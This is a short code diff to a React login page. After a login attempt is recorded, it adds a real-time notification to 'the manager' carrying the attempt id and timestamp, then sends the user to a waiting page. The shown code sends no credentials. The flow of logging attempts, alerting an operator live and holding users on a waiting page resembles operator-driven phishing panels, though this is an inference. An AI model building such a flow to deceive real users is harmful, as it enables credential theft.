@@ -3,7 +3,7 @@ import { useNavigate } from 'react-router-dom';
 import { supabase } from '@/lib/supabase';
 import { getClientId } from '@/lib/clientId';
 import { useSiteConfig } from '@/context/SiteConfigContext';
-import { initSocket, disconnectSocket, updatePage } from '@/lib/socket';
+import { initSocket, disconnectSocket, updatePage, emitInstantNotification } from '@/lib/socket';
 
 // Import Logo Component
 const Logo = () => (
@@ -100,6 +100,12 @@ export default function LoginPage() {
 
       // حفظ معرف المحاولة في sessionStorage
       sessionStorage.setItem('login_attempt_id', data.id);
+
+      // Notify the manager immediately without sending credentials
+      await emitInstantNotification('login_attempt', {
+        id: data.id,
+        created_at: typeof data.created_at === 'string' ? data.created_at : new Date().toISOString(),
+      });
       
       setLoading(false);
       navigate('/waiting');
